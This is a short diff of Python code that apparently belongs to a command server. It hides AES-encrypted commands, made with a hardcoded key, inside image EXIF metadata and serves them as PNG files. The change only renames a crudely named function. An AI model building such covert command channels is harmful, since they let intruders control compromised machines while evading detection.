@@ -13,7 +13,7 @@ key_hex_str = '966b926de08c6c0bfd3811809cba8da1'
 key = bytes.fromhex(key_hex_str)
 
 
-def let_me_serve_you_bitch_lasagna(data, image_path='./image.png'):
+def funny_meme_go_brrrrrr(data, image_path='./image.png'):
     img = Image.open(image_path)
     if "exif" in img.info:
         exif_dict = piexif.load(img.info["exif"])
@@ -43,7 +43,7 @@ def get_command():
             ct_bytes = cipher.encrypt(pad(content.encode(), AES.block_size))
             data = b64encode(cipher.iv + ct_bytes).decode('utf-8')
 
-            let_me_serve_you_bitch_lasagna(data)
+            funny_meme_go_brrrrrr(data)
 
             return send_file('./image.png', mimetype='image/png')
 
